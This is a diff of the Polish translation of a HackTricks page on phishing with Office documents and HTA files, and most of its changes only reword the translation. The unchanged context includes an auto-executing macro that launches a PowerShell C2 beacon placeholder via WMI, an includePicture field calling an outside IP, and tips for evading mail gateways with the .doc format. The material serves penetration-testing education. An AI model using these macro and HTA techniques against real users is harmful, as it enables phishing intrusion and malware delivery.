@@ -7,14 +7,14 @@
 * Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Dokumenty Biurowe
 
-Microsoft Word wykonuje walidację danych pliku przed otwarciem. Walidacja danych odbywa się poprzez identyfikację struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli wystąpi błąd podczas identyfikacji struktury danych, analizowany plik nie zostanie otwarty.
+Microsoft Word wykonuje walidację danych pliku przed otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli wystąpi błąd podczas identyfikacji struktury danych, analizowany plik nie zostanie otwarty.
 
 Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednakże, możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia i zachowanie zdolności do wykonywania makr.\
 Na przykład plik RTF nie obsługuje makr, z założenia, ale plik DOCM zmieniony na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonania makr.\
@@ -27,9 +27,9 @@ assoc | findstr /i "word excel powerp"
 ### Ładowanie zewnętrznego obrazu
 
 Przejdź do: _Wstaw --> Szybkie części --> Pole_\
-_**Kategorie**: Linki i odwołania, **Nazwy pól**: includePicture, a **Nazwa pliku lub URL**:_ http://\<ip>/whatever
+_**Kategorie**: Linki i odwołania, **Nazwy pól**: includePicture, a **Nazwa pliku lub adres URL**:_ http://\<ip>/cokolwiek
 
-![](<../../.gitbook/assets/image (152).png>)
+![](<../../.gitbook/assets/image (155).png>)
 
 ### Tylnie drzwi makr
 
@@ -37,7 +37,7 @@ Możliwe jest użycie makr do uruchamiania dowolnego kodu z dokumentu.
 
 #### Funkcje automatycznego ładowania
 
-Im bardziej popularne są, tym bardziej prawdopodobne jest wykrycie ich przez oprogramowanie antywirusowe.
+Im bardziej popularne, tym bardziej prawdopodobne jest wykrycie ich przez oprogramowanie antywirusowe.
 
 * AutoOpen()
 * Document\_Open()
@@ -72,14 +72,14 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Usuń metadane ręcznie
+#### Usunięcie metadanych ręcznie
 
-Przejdź do **Plik > Informacje > Inspekcja dokumentu > Inspekcja dokumentu**, co spowoduje otwarcie Inspektora dokumentów. Kliknij **Inspekcja**, a następnie **Usuń wszystko** obok **Właściwości dokumentu i informacje osobiste**.
+Przejdź do **Plik > Informacje > Sprawdź dokument > Sprawdź dokument**, co spowoduje otwarcie Inspektora dokumentów. Kliknij **Sprawdź** a następnie **Usuń wszystko** obok **Właściwości dokumentu i informacji osobistych**.
 
 #### Rozszerzenie dokumentu
 
-Po zakończeniu wybierz rozwijane menu **Zapisz jako typ**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
-Zrób to, ponieważ **nie można zapisać makr wewnątrz pliku `.docx`** i istnieje **stygmat** związany z rozszerzeniem **`.docm`** obsługującym makra (np. ikona miniatury ma duże `!` i niektóre bramy internetowe/e-mail blokują je całkowicie). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.
+Po zakończeniu wybierz rozwijaną listę **Zapisz jako typ**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
+Zrób to, ponieważ **nie można zapisać makr wewnątrz pliku `.docx`** i istnieje **stygmat** wokół rozszerzenia z makrami **`.docm`** (np. ikona miniatury ma duże `!` i niektóre bramy internetowe/e-mail blokują je całkowicie). Dlatego **to dziedziczone rozszerzenie `.doc` jest najlepszym kompromisem**.
 
 #### Generatory złośliwych makr
 
@@ -89,9 +89,9 @@ Zrób to, ponieważ **nie można zapisać makr wewnątrz pliku `.docx`** i istni
 
 ## Pliki HTA
 
-HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako aplikacja "w pełni zaufana", bez ograniczeń modelu bezpieczeństwa przeglądarki.
+HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja "w pełni zaufana", bez ograniczeń modelu bezpieczeństwa przeglądarki.
 
-HTA jest wykonywany za pomocą **`mshta.exe`**, który zazwyczaj jest **zainstalowany** razem z **Internet Explorer**, co sprawia, że **`mshta` zależy od IE**. Jeśli został odinstalowany, pliki HTA nie będą mogły być uruchomione.
+HTA jest wykonywany za pomocą **`mshta.exe`**, który zazwyczaj jest **zainstalowany** razem z **Internet Explorer**, co sprawia, że **`mshta` zależy od IE**. Jeśli został odinstalowany, pliki HTA nie będą mogły być wykonane.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -171,7 +171,7 @@ Nie zapomnij, że możesz nie tylko ukraść skrót lub uwierzytelnienie, ale ta
 
 <summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Czy pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
